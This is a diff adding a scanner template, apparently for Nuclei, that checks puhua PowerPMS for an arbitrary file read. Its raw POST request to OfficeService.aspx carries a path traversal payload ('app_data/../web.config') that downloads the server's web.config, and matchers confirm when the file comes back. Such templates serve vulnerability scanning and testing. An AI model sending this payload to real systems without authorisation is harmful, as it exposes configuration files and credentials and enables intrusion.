@@ -1,0 +1,23 @@
+id: puhua-PowerPMS-OfficeService-fileread
+
+info:
+  name: puhua-PowerPMS-OfficeService-fileread
+  author: puhua
+  severity: high
+  tags: puhua
+
+http:
+  - raw:
+      - |
+        POST /PowerPlat/FormXml/DocFile/OfficeService.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=download&WEBURL=app_data/../web.config
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "<?xml version=")'
+          - 'contains(header, "Content-Disposition: attachment;filename=web.config")'
+        condition: and
